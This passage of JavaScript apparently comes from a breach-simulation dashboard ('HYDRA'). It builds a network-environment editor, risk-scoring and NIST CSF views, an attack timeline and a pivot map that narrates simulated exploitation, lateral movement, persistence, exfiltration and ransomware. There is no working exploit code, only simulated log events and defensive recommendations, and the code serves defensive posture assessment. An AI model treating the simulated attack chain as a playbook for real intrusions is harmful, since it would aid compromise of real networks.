      var value = parseInt(valSlider.value) || 5;
      var id = name.toLowerCase().replace(/[^a-z0-9]/g, '') + '_' + Date.now().toString(36);
      engine.hosts.push({ id: id, name: name, ip: ip, os: os, role: role, x: 100 + Math.random() * 500, y: 100 + Math.random() * 400, services: services, controls: controls, value: value, segment: segment, creds: [], status: 'unknown', findings: [], sessions: [], persistence: [], exfilData: [], harvestedCreds: [] });
      renderEditorTab(container);
    };
    container.onclick = function(e) {
      if (e.target.dataset.rmhost) {
        var rid = e.target.dataset.rmhost;
        engine.hosts = engine.hosts.filter(function(h) { return h.id !== rid; });
        engine.connections = engine.connections.filter(function(c) { return c.from !== rid && c.to !== rid; });
        renderEditorTab(container);
      }
      if (e.target.dataset.load !== undefined) {
        var env = saved[parseInt(e.target.dataset.load)];
        if (env) {
          engine.hosts = JSON.parse(JSON.stringify(env.hosts));
          engine.connections = JSON.parse(JSON.stringify(env.connections || []));
          engine.hosts.forEach(function(h) { h.status = 'unknown'; h.findings = []; h.sessions = []; h.persistence = []; h.exfilData = []; h.harvestedCreds = []; });
          engine.intel = { credentials: [], sessions: [], services: [], vulns: [], data: [] };
          engine.log = [];
          engine.tick = 0;
        }
        renderEditorTab(container);
      }
      if (e.target.dataset.del !== undefined) {
        saved.splice(parseInt(e.target.dataset.del), 1);
        try { localStorage.setItem('hydra_custom_envs', JSON.stringify(saved)); } catch(_){}
        renderEditorTab(container);
      }
    };
    var addConnBtn = container.querySelector('#ne-addconn');
    if (addConnBtn) addConnBtn.onclick = function() {
      var from = container.querySelector('#ne-from').value;
      var to = container.querySelector('#ne-to').value;
      var bidir = container.querySelector('#ne-bidir').checked;
      if (from && to && from !== to) {
        engine.connections.push({ from: from, to: to, bidir: bidir, rules: ['*'] });
        renderEditorTab(container);
      }
    };
    var saveBtn = container.querySelector('#ne-save');
    if (saveBtn) saveBtn.onclick = function() {
      var ename = container.querySelector('#ne-envname').value.trim() || ('Custom-' + Date.now().toString(36));
      saved.push({ name: ename, hosts: JSON.parse(JSON.stringify(engine.hosts)), connections: JSON.parse(JSON.stringify(engine.connections)) });
      try { localStorage.setItem('hydra_custom_envs', JSON.stringify(saved)); } catch(_){}
      renderEditorTab(container);
    };
  }

  // ========================================================================
  // RISK SCORING TAB
  // ========================================================================
  function renderScoringTab(container) {
    if (engine.hosts.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Load an environment first to calculate risk scores.</p>';
      return;
    }
    var totalHosts = engine.hosts.length;
    var withEDR = engine.hosts.filter(function(h) { return h.controls.indexOf('edr') >= 0; }).length;
    var withAV = engine.hosts.filter(function(h) { return h.controls.indexOf('av') >= 0; }).length;
    var withSIEM = engine.hosts.filter(function(h) { return h.controls.indexOf('siem_agent') >= 0; }).length;
    var withMFA = engine.hosts.filter(function(h) { return h.controls.indexOf('mfa') >= 0; }).length;
    var weakCreds = engine.hosts.filter(function(h) { return h.creds && h.creds.some(function(c) { return c.pass; }); }).length;
    var segments = {};
    engine.hosts.forEach(function(h) { segments[h.segment || 'default'] = true; });
    var segCount = Object.keys(segments).length;
    var compromised = engine.hosts.filter(function(h) { return h.sessions && h.sessions.length > 0; }).length;

    // Calculate scores
    var edrScore = Math.round((withEDR / totalHosts) * 25);
    var avScore = Math.round((withAV / totalHosts) * 10);
    var siemScore = Math.round((withSIEM / totalHosts) * 20);
    var credScore = Math.round(((totalHosts - weakCreds) / totalHosts) * 15);
    var segScore = Math.min(15, segCount * 3);
    var mfaScore = Math.round((withMFA / totalHosts) * 15);
    var overallScore = edrScore + avScore + siemScore + credScore + segScore + mfaScore;
    var scoreColor = overallScore >= 75 ? '#00e676' : overallScore >= 50 ? '#ffd600' : overallScore >= 25 ? '#ff9100' : '#ff1744';
    var maturity = overallScore >= 80 ? 'Optimizing' : overallScore >= 60 ? 'Quantitatively Managed' : overallScore >= 40 ? 'Defined' : overallScore >= 20 ? 'Managed' : 'Initial';

    var html = '<h2 class="pg-h2">Risk Scoring & Security Posture</h2>' +
      '<div style="display:grid;grid-template-columns:200px 1fr;gap:20px;margin-top:16px">' +
        // Score circle
        '<div style="text-align:center;padding:20px">' +
          '<div style="width:140px;height:140px;border-radius:50%;border:6px solid ' + scoreColor + ';display:flex;align-items:center;justify-content:center;flex-direction:column;margin:0 auto">' +
            '<div style="font-size:2.5rem;font-weight:800;color:' + scoreColor + '">' + overallScore + '</div>' +
            '<div style="font-size:.7rem;color:var(--mut)">/ 100</div>' +
          '</div>' +
          '<div style="margin-top:12px;font-size:.85rem;font-weight:600;color:' + scoreColor + '">' + maturity + '</div>' +
          '<div style="font-size:.7rem;color:var(--mut)">Maturity Level</div>' +
        '</div>' +
        // Score breakdown
        '<div>' +
          '<div style="font-size:.85rem;font-weight:600;margin-bottom:10px">Score Breakdown</div>' +
          scoreBar('EDR Coverage', edrScore, 25, withEDR + '/' + totalHosts + ' hosts') +
          scoreBar('SIEM Coverage', siemScore, 20, withSIEM + '/' + totalHosts + ' hosts') +
          scoreBar('Credential Hygiene', credScore, 15, (totalHosts - weakCreds) + '/' + totalHosts + ' clean') +
          scoreBar('Network Segmentation', segScore, 15, segCount + ' segments') +
          scoreBar('MFA Deployment', mfaScore, 15, withMFA + '/' + totalHosts + ' hosts') +
          scoreBar('AV Coverage', avScore, 10, withAV + '/' + totalHosts + ' hosts') +
        '</div>' +
      '</div>';

    // NIST CSF alignment
    var nist = {
      Identify: Math.min(100, segCount * 15 + (totalHosts > 5 ? 20 : 10)),
      Protect: Math.min(100, edrScore * 3 + avScore * 4 + mfaScore * 3),
      Detect: Math.min(100, siemScore * 4 + (withEDR / totalHosts) * 40),
      Respond: engine.log.length > 0 ? 40 : 10,
      Recover: 20
    };
    html += '<h3 style="font-size:.9rem;margin-top:24px;margin-bottom:10px">NIST CSF Alignment</h3>' +
      '<div style="display:flex;gap:12px;flex-wrap:wrap">';
    Object.keys(nist).forEach(function(fn) {
      var v = Math.round(nist[fn]);
      var c = v >= 70 ? '#00e676' : v >= 40 ? '#ffd600' : '#ff1744';
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px 20px;min-width:100px;text-align:center">' +
        '<div style="font-size:1.3rem;font-weight:700;color:' + c + '">' + v + '%</div>' +
        '<div style="font-size:.72rem;color:var(--mut)">' + fn + '</div></div>';
    });
    html += '</div>';

    // Per-host risk
    html += '<h3 style="font-size:.9rem;margin-top:24px;margin-bottom:10px">Per-Host Risk Assessment</h3>' +
      '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.75rem">' +
      '<thead><tr style="border-bottom:2px solid var(--line)">' +
      '<th style="padding:6px;text-align:left;color:var(--mut)">Host</th>' +
      '<th style="padding:6px;text-align:left;color:var(--mut)">Value</th>' +
      '<th style="padding:6px;text-align:left;color:var(--mut)">Controls</th>' +
      '<th style="padding:6px;text-align:left;color:var(--mut)">Risk</th>' +
      '<th style="padding:6px;text-align:left;color:var(--mut)">Recommendation</th>' +
      '</tr></thead><tbody>';
    engine.hosts.forEach(function(h) {
      var ctrlCount = h.controls ? h.controls.length : 0;
      var risk = Math.max(0, h.value * 10 - ctrlCount * 15);
      var rc = risk >= 70 ? '#ff1744' : risk >= 40 ? '#ff9100' : '#00e676';
      var rec = [];
      if (h.controls.indexOf('edr') < 0) rec.push('Deploy EDR');
      if (h.controls.indexOf('siem_agent') < 0) rec.push('Add SIEM agent');
      if (h.value >= 8 && h.controls.indexOf('mfa') < 0) rec.push('Enable MFA');
      if (h.creds && h.creds.some(function(c) { return c.pass; })) rec.push('Rotate weak credentials');
      html += '<tr style="border-bottom:1px solid var(--line)">' +
        '<td style="padding:6px;font-weight:600">' + esc(h.name) + '</td>' +
        '<td style="padding:6px">' + h.value + '/10</td>' +
        '<td style="padding:6px;font-size:.7rem">' + (h.controls.length > 0 ? h.controls.join(', ') : '<span style="color:#ff1744">none</span>') + '</td>' +
        '<td style="padding:6px;font-weight:600;color:' + rc + '">' + risk + '</td>' +
        '<td style="padding:6px;font-size:.7rem;color:var(--mut)">' + (rec.length > 0 ? rec.join('; ') : 'Adequate') + '</td>' +
      '</tr>';
    });
    html += '</tbody></table></div>';

    // Quick wins
    html += '<h3 style="font-size:.9rem;margin-top:24px;margin-bottom:10px">Quick Wins (Highest Impact, Lowest Effort)</h3>' +
      '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:10px">';
    var wins = [
      { cond: weakCreds > 0, title: 'Rotate Default Credentials', impact: 'High', effort: 'Low', desc: weakCreds + ' host(s) have weak/default passwords. Rotating these eliminates trivial initial access and lateral movement.' },
      { cond: withEDR < totalHosts, title: 'Deploy EDR to All Servers', impact: 'Critical', effort: 'Medium', desc: (totalHosts - withEDR) + ' host(s) lack EDR. This would detect Mimikatz, process injection, and most post-exploitation activity.' },
      { cond: withSIEM < totalHosts, title: 'Deploy SIEM Agents', impact: 'High', effort: 'Medium', desc: (totalHosts - withSIEM) + ' host(s) have no SIEM coverage. Central logging enables detection of lateral movement and data exfiltration.' },
      { cond: withMFA === 0, title: 'Enable MFA for Remote Access', impact: 'Critical', effort: 'Low', desc: 'No MFA detected. Enabling MFA on VPN, RDP, and admin panels prevents credential-based attacks.' },
      { cond: true, title: 'Enable Kerberos AES, Disable RC4', impact: 'Medium', effort: 'Low', desc: 'Prevents Kerberoasting attacks from returning crackable RC4 hashes.' },
    ];
    wins.filter(function(w) { return w.cond; }).forEach(function(w) {
      var ic = w.impact === 'Critical' ? '#ff1744' : w.impact === 'High' ? '#ff9100' : '#ffd600';
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:12px;border-left:3px solid ' + ic + '">' +
        '<div style="font-weight:600;font-size:.82rem">' + esc(w.title) + '</div>' +
        '<div style="font-size:.7rem;margin-top:4px"><span style="color:' + ic + '">' + w.impact + ' impact</span> / <span style="color:var(--acc)">' + w.effort + ' effort</span></div>' +
        '<div style="font-size:.72rem;color:var(--mut);margin-top:6px">' + esc(w.desc) + '</div></div>';
    });
    html += '</div>';

    // Network Segmentation Analysis
    var segNames = Object.keys(segments);
    var crossSeg = 0;
    var totalConns = engine.connections.length;
    var dangerousPaths = [];
    engine.connections.forEach(function(c) {
      var fromH = engine.getHost(c.from);
      var toH = engine.getHost(c.to);
      if (fromH && toH && (fromH.segment || 'default') !== (toH.segment || 'default')) {
        crossSeg++;
        if ((fromH.segment === 'workstations' && (toH.segment === 'servers' || toH.segment === 'data')) ||
            (toH.segment === 'workstations' && (fromH.segment === 'servers' || fromH.segment === 'data'))) {
          dangerousPaths.push(fromH.name + ' (' + (fromH.segment || 'default') + ') <-> ' + toH.name + ' (' + (toH.segment || 'default') + ')');
        }
      }
    });
    var segmentationScore = totalConns > 0 ? Math.round(100 - (crossSeg / totalConns * 100)) : 0;
    var segScoreColor = segmentationScore >= 70 ? '#00e676' : segmentationScore >= 40 ? '#ffd600' : '#ff1744';

    html += '<h3 style="font-size:.9rem;margin-top:24px;margin-bottom:10px">Network Segmentation Analysis</h3>' +
      '<div style="display:flex;gap:16px;align-items:flex-start;flex-wrap:wrap">' +
        '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:16px;text-align:center;min-width:120px">' +
          '<div style="font-size:2rem;font-weight:800;color:' + segScoreColor + '">' + segmentationScore + '</div>' +
          '<div style="font-size:.68rem;color:var(--mut);text-transform:uppercase;letter-spacing:.04em">Segmentation</div>' +
        '</div>' +
        '<div style="flex:1;min-width:200px">' +
          '<div style="font-size:.75rem;margin-bottom:8px"><span style="color:var(--mut)">Segments: </span><span style="color:var(--acc)">' + segNames.join(', ') + '</span></div>' +
          '<div style="font-size:.75rem;margin-bottom:8px"><span style="color:var(--mut)">Cross-segment connections: </span><span style="color:' + (crossSeg > totalConns / 2 ? '#ff9100' : 'var(--acc)') + '">' + crossSeg + '/' + totalConns + '</span></div>' +
          (dangerousPaths.length > 0 ?
            '<div style="font-size:.72rem;color:#ff1744;margin-top:8px;font-weight:600">Dangerous cross-segment paths:</div>' +
            dangerousPaths.map(function(p) { return '<div style="font-size:.68rem;color:var(--mut);padding:2px 0">  ' + esc(p) + '</div>'; }).join('') : '<div style="font-size:.72rem;color:#00e676">No dangerous direct cross-segment paths detected.</div>') +
        '</div>' +
        '<div style="flex:1;min-width:200px">' +
          '<div style="font-size:.72rem;color:var(--mut);font-weight:600;margin-bottom:6px">Segment Reachability Matrix:</div>' +
          '<div style="overflow-x:auto"><table style="border-collapse:collapse;font-size:.62rem">' +
            '<tr><th style="padding:3px 6px;border:1px solid var(--line)"></th>' + segNames.map(function(s) { return '<th style="padding:3px 6px;border:1px solid var(--line);color:var(--acc);writing-mode:vertical-lr;text-orientation:mixed;max-height:60px">' + esc(s) + '</th>'; }).join('') + '</tr>' +
            segNames.map(function(rowSeg) {
              return '<tr><td style="padding:3px 6px;border:1px solid var(--line);color:var(--acc);font-weight:600">' + esc(rowSeg) + '</td>' +
                segNames.map(function(colSeg) {
                  if (rowSeg === colSeg) return '<td style="padding:3px 6px;border:1px solid var(--line);text-align:center;background:rgba(255,255,255,.03);color:var(--mut)">--</td>';
                  var hasConn = engine.connections.some(function(c) {
                    var f = engine.getHost(c.from);
                    var t = engine.getHost(c.to);
                    return f && t && (((f.segment || 'default') === rowSeg && (t.segment || 'default') === colSeg) || (c.bidir && (f.segment || 'default') === colSeg && (t.segment || 'default') === rowSeg));
                  });
                  return '<td style="padding:3px 6px;border:1px solid var(--line);text-align:center;color:' + (hasConn ? '#ff9100' : '#00e676') + ';font-weight:700">' + (hasConn ? 'YES' : 'NO') + '</td>';
                }).join('') +
              '</tr>';
            }).join('') +
          '</table></div>' +
        '</div>' +
      '</div>';

    // Campaign History
    var campaigns = [];
    try { campaigns = JSON.parse(localStorage.getItem('hydra_campaigns') || '[]'); } catch(e) {}
    if (campaigns.length > 0) {
      html += '<h3 style="font-size:.9rem;margin-top:24px;margin-bottom:10px">Campaign History</h3>' +
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">' +
          '<span style="font-size:.72rem;color:var(--mut)">' + campaigns.length + ' past operations</span>' +
          '<span style="flex:1"></span>' +
          '<button class="hy-btn hy-btn-ghost" id="hy-clear-history" style="padding:3px 8px;font-size:.6rem">CLEAR HISTORY</button>' +
        '</div>';
      // Improvement indicator
      if (campaigns.length >= 2) {
        var last = campaigns[campaigns.length - 1];
        var prev = campaigns[campaigns.length - 2];
        var scoreChange = (last.score || 0) - (prev.score || 0);
        if (scoreChange !== 0) {
          var impColor = scoreChange < 0 ? '#00e676' : '#ff1744';
          html += '<div style="font-size:.75rem;color:' + impColor + ';margin-bottom:8px">' +
            'Threat score ' + (scoreChange < 0 ? 'decreased' : 'increased') + ' by ' + Math.abs(scoreChange) + ' since last run' +
            (scoreChange < 0 ? ' — security posture improving' : ' — security posture degrading') +
          '</div>';
        }
      }
      html += '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.7rem">' +
        '<thead><tr style="border-bottom:2px solid var(--line)">' +
        '<th style="padding:4px 8px;text-align:left;color:var(--mut)">Date</th>' +
        '<th style="padding:4px 8px;text-align:left;color:var(--mut)">Hosts</th>' +
        '<th style="padding:4px 8px;text-align:left;color:var(--mut)">Compromised</th>' +
        '<th style="padding:4px 8px;text-align:left;color:var(--mut)">Vulns</th>' +
        '<th style="padding:4px 8px;text-align:left;color:var(--mut)">Creds</th>' +
        '<th style="padding:4px 8px;text-align:left;color:var(--mut)">Threat</th>' +
        '<th style="padding:4px 8px;text-align:left;color:var(--mut)">Controls</th>' +
        '</tr></thead><tbody>';
      campaigns.slice().reverse().forEach(function(c) {
        var threatC = c.score >= 60 ? '#ff1744' : c.score >= 30 ? '#ff9100' : '#00e676';
        html += '<tr style="border-bottom:1px solid var(--line)">' +
          '<td style="padding:4px 8px">' + esc(c.ts ? c.ts.slice(0, 16).replace('T', ' ') : '--') + '</td>' +
          '<td style="padding:4px 8px">' + (c.hostCount || 0) + '</td>' +
          '<td style="padding:4px 8px;color:#ff1744">' + (c.compromised || 0) + '/' + (c.hostCount || 0) + '</td>' +
          '<td style="padding:4px 8px">' + (c.vulns || 0) + '</td>' +
          '<td style="padding:4px 8px">' + (c.creds || 0) + '</td>' +
          '<td style="padding:4px 8px;color:' + threatC + '">' + (c.score || 0) + '</td>' +
          '<td style="padding:4px 8px">' + (c.controls || 0) + '</td>' +
        '</tr>';
      });
      html += '</tbody></table></div>';
    }

    container.innerHTML = html;

    // Wire clear history button
    var clearBtn = container.querySelector('#hy-clear-history');
    if (clearBtn) {
      clearBtn.onclick = function() {
        try { localStorage.removeItem('hydra_campaigns'); } catch(e) {}
        renderScoringTab(container);
      };
    }
  }

  function scoreBar(label, score, max, detail) {
    var pct = Math.round((score / max) * 100);
    var c = pct >= 70 ? '#00e676' : pct >= 40 ? '#ffd600' : '#ff1744';
    return '<div style="margin-bottom:8px">' +
      '<div style="display:flex;justify-content:space-between;font-size:.75rem;margin-bottom:3px">' +
        '<span>' + label + '</span><span style="color:var(--mut)">' + score + '/' + max + ' (' + detail + ')</span></div>' +
      '<div style="height:6px;background:rgba(255,255,255,0.08);border-radius:3px"><div style="height:100%;width:' + pct + '%;background:' + c + ';border-radius:3px"></div></div></div>';
  }

  // ========================================================================
  // ATTACK TIMELINE TAB
  // ========================================================================
  function renderTimelineTab(container) {
    var attacks = engine.log.filter(function(e) {
      return e.msg.indexOf('[SHELL]') >= 0 || e.msg.indexOf('[MOVED]') >= 0 || e.msg.indexOf('[HARVEST]') >= 0 || e.msg.indexOf('[IMPLANT]') >= 0 || e.msg.indexOf('[DATA]') >= 0 || e.msg.indexOf('Discovered') >= 0 || e.msg.indexOf('[VULN]') >= 0;
    });
    if (attacks.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Run an operation first to view the attack timeline.</p>';
      return;
    }
    // Calculate dwell times
    var firstExploit = engine.log.find(function(e) { return e.msg.indexOf('[SHELL]') >= 0; });
    var firstLateral = engine.log.find(function(e) { return e.msg.indexOf('[MOVED]') >= 0; });
    var firstExfil = engine.log.find(function(e) { return e.msg.indexOf('[DATA]') >= 0; });
    var dcCompromise = engine.log.find(function(e) { return (e.msg.indexOf('[SHELL]') >= 0 || e.msg.indexOf('[MOVED]') >= 0) && e.msg.indexOf('DC') >= 0; });

    var html = '<h2 class="pg-h2">Attack Timeline</h2>' +
      '<p class="muted" style="margin-bottom:16px">Visual progression of the attack through the kill chain.</p>';

    // Dwell time metrics
    html += '<div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:20px">';
    if (firstExploit) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px 18px">' +
        '<div style="font-size:1.2rem;font-weight:700;color:#ff1744">Tick ' + firstExploit.tick + '</div>' +
        '<div style="font-size:.7rem;color:var(--mut)">Initial Access</div></div>';
    }
    if (firstLateral) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px 18px">' +
        '<div style="font-size:1.2rem;font-weight:700;color:#ffd600">Tick ' + firstLateral.tick + '</div>' +
        '<div style="font-size:.7rem;color:var(--mut)">First Lateral Move</div>' +
        '<div style="font-size:.65rem;color:var(--acc)">Dwell: ' + (firstLateral.tick - (firstExploit ? firstExploit.tick : 0)) + ' ticks</div></div>';
    }
    if (dcCompromise) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px 18px">' +
        '<div style="font-size:1.2rem;font-weight:700;color:#d500f9">Tick ' + dcCompromise.tick + '</div>' +
        '<div style="font-size:.7rem;color:var(--mut)">Domain Admin</div></div>';
    }
    if (firstExfil) {
      html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:10px 18px">' +
        '<div style="font-size:1.2rem;font-weight:700;color:#00e676">Tick ' + firstExfil.tick + '</div>' +
        '<div style="font-size:.7rem;color:var(--mut)">Data Exfiltration</div>' +
        '<div style="font-size:.65rem;color:var(--acc)">Total: ' + (firstExfil.tick - (firstExploit ? firstExploit.tick : 0)) + ' ticks from access to exfil</div></div>';
    }
    html += '</div>';

    // Industry comparison
    html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:6px;padding:14px;margin-bottom:20px">' +
      '<div style="font-size:.85rem;font-weight:600;margin-bottom:8px">Industry Comparison</div>' +
      '<div style="font-size:.78rem;color:var(--mut);line-height:1.6">' +
        'Median dwell time (real-world): <span style="color:var(--acc)">16 days</span> (Mandiant M-Trends 2024)<br>' +
        'Median time to lateral movement: <span style="color:var(--acc)">1 hour 42 minutes</span> (CrowdStrike 2024)<br>' +
        'Median ransomware deployment: <span style="color:var(--acc)">4-14 days</span> after initial access<br>' +
        'HYDRA operation completed in <span style="color:#ff1744">' + engine.tick + ' ticks</span> — each tick represents a discrete action phase.' +
      '</div></div>';

    // Visual timeline
    var maxTick = engine.tick || 1;
    html += '<div style="position:relative;padding-left:60px;margin-top:16px">';
    attacks.forEach(function(evt) {
      var color = AGENT_COLORS[evt.agent] || '#888';
      var leftPct = Math.round((evt.tick / maxTick) * 100);
      var phase = evt.agent;
      if (evt.msg.indexOf('Discovered') >= 0 || evt.msg.indexOf('[VULN]') >= 0) phase = 'RECON';
      else if (evt.msg.indexOf('[SHELL]') >= 0) phase = 'EXPLOIT';
      else if (evt.msg.indexOf('[MOVED]') >= 0 || evt.msg.indexOf('[HARVEST]') >= 0) phase = 'LATERAL';
      else if (evt.msg.indexOf('[IMPLANT]') >= 0) phase = 'PERSIST';
      else if (evt.msg.indexOf('[DATA]') >= 0) phase = 'EXFIL';
      html += '<div style="display:flex;align-items:flex-start;gap:12px;margin-bottom:6px;font-size:.72rem">' +
        '<div style="width:40px;text-align:right;color:var(--mut);flex-shrink:0">T' + evt.tick + '</div>' +
        '<div style="width:4px;background:' + color + ';border-radius:2px;flex-shrink:0;align-self:stretch;min-height:20px"></div>' +
        '<div><span style="color:' + color + ';font-weight:600">[' + phase + ']</span> ' + esc(evt.msg.replace(/\[.*?\]\s*/, '')) + '</div>' +
      '</div>';
    });
    html += '</div>';
    container.innerHTML = html;
  }

  // ========================================================================
  // PIVOT MAP TAB — Attack flow diagram + narrative
  // ========================================================================
  function renderPivotMapTab(container) {
    var exploits = engine.log.filter(function(e) { return e.msg.indexOf('[SHELL]') >= 0; });
    var laterals = engine.log.filter(function(e) { return e.msg.indexOf('[MOVED]') >= 0; });
    var exfils = engine.log.filter(function(e) { return e.msg.indexOf('[DATA]') >= 0; });
    var persists = engine.log.filter(function(e) { return e.msg.indexOf('[IMPLANT]') >= 0; });
    if (exploits.length === 0 && laterals.length === 0) {
      container.innerHTML = '<p class="muted" style="padding:40px;text-align:center">Run an operation first to generate the pivot map.</p>';
      return;
    }
    // Build attack chain
    var chains = [];
    exploits.forEach(function(e) {
      var host = engine.hosts.find(function(h) { return e.msg.indexOf(h.name) >= 0; });
      if (host) chains.push({ type: 'entry', host: host.name, technique: e.msg.replace(/\[SHELL\]\s*/, ''), mitre: e.mitre, agent: 'EXPLOIT', tick: e.tick });
    });
    laterals.forEach(function(e) {
      var hosts = engine.hosts.filter(function(h) { return e.msg.indexOf(h.name) >= 0; });
      var match = e.msg.match(/(\S+)\s*->\s*(\S+)\s*via\s*(.*)/);
      chains.push({ type: 'pivot', from: match ? match[1] : (hosts[0] ? hosts[0].name : '?'), to: match ? match[2] : (hosts[1] ? hosts[1].name : '?'), technique: match ? match[3] : e.msg, mitre: e.mitre, agent: 'LATERAL', tick: e.tick });
    });
    exfils.forEach(function(e) {
      var host = engine.hosts.find(function(h) { return e.msg.indexOf(h.name) >= 0; });
      if (host) chains.push({ type: 'objective', host: host.name, objective: 'Data Exfiltration', agent: 'EXFIL', tick: e.tick });
    });
    persists.forEach(function(e) {
      var host = engine.hosts.find(function(h) { return e.msg.indexOf(h.name) >= 0; });
      if (host) chains.push({ type: 'objective', host: host.name, objective: 'Persistence', agent: 'PERSIST', tick: e.tick });
    });
    chains.sort(function(a, b) { return a.tick - b.tick; });

    // Visual flow
    var html = '<h2 style="font-size:1rem;font-weight:700;letter-spacing:.05em;margin:0 0 12px">ATTACK FLOW</h2>';
    html += '<div style="display:flex;gap:24px;flex-wrap:wrap;margin-bottom:20px">';
    // Entry points
    html += '<div style="min-width:160px"><div style="font-size:.65rem;color:var(--mut);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;border-bottom:2px solid #ff1744;padding-bottom:4px">Entry Points</div>';
    chains.filter(function(c) { return c.type === 'entry'; }).forEach(function(c) {
      html += '<div style="background:rgba(255,23,68,0.1);border:1px solid rgba(255,23,68,0.3);border-radius:4px;padding:8px;margin-bottom:6px;font-size:.72rem">' +
        '<div style="font-weight:600;color:#ff1744">' + esc(c.host) + '</div>' +
        '<div style="color:var(--mut);margin-top:2px">' + esc(c.technique) + '</div>' +
        (c.mitre ? '<div style="color:var(--acc);font-size:.65rem;margin-top:2px">' + esc(c.mitre) + '</div>' : '') +
      '</div>';
    });
    html += '</div>';
    // Pivots
    html += '<div style="min-width:200px;flex:1"><div style="font-size:.65rem;color:var(--mut);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;border-bottom:2px solid #ffd600;padding-bottom:4px">Lateral Movement</div>';
    var pivots = chains.filter(function(c) { return c.type === 'pivot'; });
    if (pivots.length > 0) {
      pivots.forEach(function(c) {
        html += '<div style="background:rgba(255,214,0,0.07);border:1px solid rgba(255,214,0,0.2);border-radius:4px;padding:8px;margin-bottom:6px;font-size:.72rem">' +
          '<div style="font-weight:600;color:#ffd600">' + esc(c.from) + ' -> ' + esc(c.to) + '</div>' +
          '<div style="color:var(--mut);margin-top:2px">' + esc(c.technique) + '</div>' +
          (c.mitre ? '<div style="color:var(--acc);font-size:.65rem;margin-top:2px">' + esc(c.mitre) + '</div>' : '') +
        '</div>';
      });
    } else {
      html += '<div style="color:var(--mut);font-size:.72rem">No lateral movement recorded.</div>';
    }
    html += '</div>';
    // Objectives
    html += '<div style="min-width:160px"><div style="font-size:.65rem;color:var(--mut);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;border-bottom:2px solid #d500f9;padding-bottom:4px">Objectives Achieved</div>';
    chains.filter(function(c) { return c.type === 'objective'; }).forEach(function(c) {
      var objColor = c.agent === 'EXFIL' ? '#d500f9' : '#00e676';
      html += '<div style="background:rgba(213,0,249,0.07);border:1px solid rgba(213,0,249,0.2);border-radius:4px;padding:8px;margin-bottom:6px;font-size:.72rem">' +
        '<div style="font-weight:600;color:' + objColor + '">' + esc(c.objective) + '</div>' +
        '<div style="color:var(--mut);margin-top:2px">' + esc(c.host) + '</div>' +
      '</div>';
    });
    if (chains.filter(function(c) { return c.type === 'objective'; }).length === 0) {
      html += '<div style="color:var(--mut);font-size:.72rem">No objectives achieved yet.</div>';
    }
    html += '</div></div>';

    // Attack Narrative
    html += '<h2 style="font-size:1rem;font-weight:700;letter-spacing:.05em;margin:20px 0 12px">ATTACK NARRATIVE</h2>';
    html += '<div style="background:var(--card);border:1px solid var(--line);border-radius:4px;padding:16px;font-size:.78rem;line-height:1.8;color:var(--txt)">';
    var narrative = 'The engagement began with ';
    var entries = chains.filter(function(c) { return c.type === 'entry'; });
    if (entries.length > 0) {
      narrative += 'exploitation of ' + entries[0].technique.replace(/ via .*/, '') + ' on ' + entries[0].host + ', yielding an initial foothold. ';
    }
    var harvests = engine.log.filter(function(e) { return e.msg.indexOf('[HARVEST]') >= 0; });
    if (harvests.length > 0) {
      narrative += 'Credential harvesting on compromised hosts yielded ' + engine.intel.credentials.length + ' credential set(s), ';
      narrative += 'including domain-level credentials that enabled further access. ';
    }
    if (pivots.length > 0) {
      narrative += 'Lateral movement was achieved across ' + pivots.length + ' hop(s), ';
      var techniques = [];
      pivots.forEach(function(p) { if (techniques.indexOf(p.technique) < 0) techniques.push(p.technique); });
      narrative += 'using ' + techniques.join(', ') + '. ';
      var dc = pivots.find(function(p) { return p.to && (p.to.indexOf('DC') >= 0 || p.to.indexOf('Domain') >= 0); });
      if (dc) narrative += 'Notably, the domain controller (' + dc.to + ') was compromised, granting full domain administrative privileges. ';
    }
    var persistHosts = chains.filter(function(c) { return c.type === 'objective' && c.objective === 'Persistence'; });
    if (persistHosts.length > 0) {
      narrative += 'Persistence mechanisms were established on ' + persistHosts.length + ' host(s) to maintain access. ';
    }
    var exfilHosts = chains.filter(function(c) { return c.type === 'objective' && c.objective === 'Data Exfiltration'; });
    if (exfilHosts.length > 0) {
      narrative += 'Data exfiltration was executed from ' + exfilHosts.length + ' high-value target(s) including ' + exfilHosts.map(function(c) { return c.host; }).join(', ') + '. ';
    }
    if (engine.intel.ransomware) {
      narrative += 'A ransomware scenario was deployed, encrypting ' + engine.intel.ransomware.totalGB + ' GB across compromised hosts. ';
      if (engine.intel.ransomware.backupCompromised) narrative += 'CRITICALLY, the backup server was also compromised, eliminating the primary recovery option. ';
    }
    narrative += 'The full attack chain was completed in ' + engine.tick + ' operational phases.';
    html += esc(narrative);
    html += '</div>';

    // Chain summary table
    html += '<h2 style="font-size:1rem;font-weight:700;letter-spacing:.05em;margin:20px 0 12px">CHAIN DETAILS</h2>';
    html += '<div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:.72rem">';
    html += '<thead><tr style="border-bottom:2px solid var(--line)">';
    html += '<th style="padding:6px;text-align:left;color:var(--mut)">Tick</th>';
    html += '<th style="padding:6px;text-align:left;color:var(--mut)">Phase</th>';
    html += '<th style="padding:6px;text-align:left;color:var(--mut)">Type</th>';
    html += '<th style="padding:6px;text-align:left;color:var(--mut)">Details</th>';
    html += '<th style="padding:6px;text-align:left;color:var(--mut)">MITRE</th>';
    html += '</tr></thead><tbody>';
    chains.forEach(function(c) {
      var color = AGENT_COLORS[c.agent] || '#888';
      var details = '';
